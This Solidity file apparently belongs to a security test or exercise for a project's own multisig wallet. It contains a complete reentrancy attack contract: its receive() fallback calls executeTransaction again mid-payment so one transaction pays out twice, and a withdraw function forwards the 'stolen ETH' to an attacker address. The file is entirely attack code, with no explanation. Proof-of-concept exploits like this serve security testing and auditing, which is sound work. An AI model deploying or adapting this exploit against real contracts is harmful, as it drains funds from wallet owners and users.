// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../src/MultiSig.sol";

contract MultiSigAttack {
    MultiSigWallet public wallet;
    uint256 public txId;
    bool public attacked;
    address public immutable attackerAddress;

    constructor(address _wallet, address _attackerAddress) {
        wallet = MultiSigWallet(payable(_wallet));
        attackerAddress = _attackerAddress;
    }

    // Fallback gets triggered when funds are sent via .call
    receive() external payable {
        if (!attacked) {
            attacked = true;
            wallet.executeTransaction(txId); // Reentrant call
        }
    }

    // Helper to prepare and initiate the attack
    function attack(uint256 _txId) external {
        txId = _txId;
        wallet.executeTransaction(_txId);
    }

    // Withdraw stolen ETH
    function withdraw() external {
        // payable(msg.sender).transfer(address(this).balance);
        (bool success,) = payable(attackerAddress).call{value: address(this).balance}("");
        require(success, "withdraw failed");
    }
}
